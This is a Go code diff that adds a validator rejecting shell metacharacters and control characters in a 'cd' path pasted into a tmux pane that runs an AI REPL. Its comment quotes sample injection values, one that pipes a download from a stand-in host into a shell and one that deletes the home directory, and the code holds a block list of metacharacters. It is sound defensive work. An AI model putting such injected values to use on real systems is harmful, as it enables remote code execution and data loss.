@@ -255,3 +255,27 @@ func levenshteinDistance(a, b string) int {
 func min3(a, b, c int) int {
 	return min(min(a, b), c)
 }
+
+// ValidateSendDirPath rejects paths that, when interpolated into a
+// `cd %s\r` string and pasted into a tmux pane (which forwards bytes
+// verbatim to the pane's shell), would let the operator execute arbitrary
+// commands. The path arrives via the generic Agent.ExecuteCommand
+// interface (MCP server, workflow, supervisor) so the project's threat
+// model treats it as hostile. A value like `legitdir;curl evil|sh` or
+// `dir$(rm -rf ~)` would otherwise produce shell injection; embedded
+// `\r`/`\n` could also submit additional inputs to a still-running
+// Gemini/Claude REPL before the cd was meant to take effect.
+func ValidateSendDirPath(p string) error {
+	if p == "" {
+		return fmt.Errorf("cd path is empty")
+	}
+	for _, r := range p {
+		switch r {
+		case '\n', '\r', 0:
+			return fmt.Errorf("cd path contains control character")
+		case ';', '|', '&', '$', '`', '"', '\'', '<', '>', '*', '?', '(', ')', '{', '}', '[', ']', '!', '#', '\\', ' ', '\t':
+			return fmt.Errorf("cd path contains disallowed character %q", r)
+		}
+	}
+	return nil
+}
